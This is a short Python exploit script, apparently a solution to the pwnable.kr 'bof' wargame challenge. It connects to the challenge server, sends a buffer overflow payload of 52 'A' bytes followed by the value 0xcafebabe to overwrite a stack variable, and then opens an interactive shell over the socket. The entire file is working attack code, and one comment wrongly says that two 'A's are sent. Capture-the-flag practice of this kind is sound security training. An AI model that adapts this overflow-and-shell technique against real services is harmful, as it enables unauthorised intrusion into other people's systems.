import socket
import telnetlib

# open a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.kr', 9000))

###### THE IMPORTANT PART ######
# send 2 "A"s to the remote server
payload = "A"*52+"\xbe"+"\xba"+"\xfe"+"\xca"
s.send(payload)
###### THE IMPORTANT PART ######

# start a shell
t = telnetlib.Telnet()
t.sock = s
t.interact()

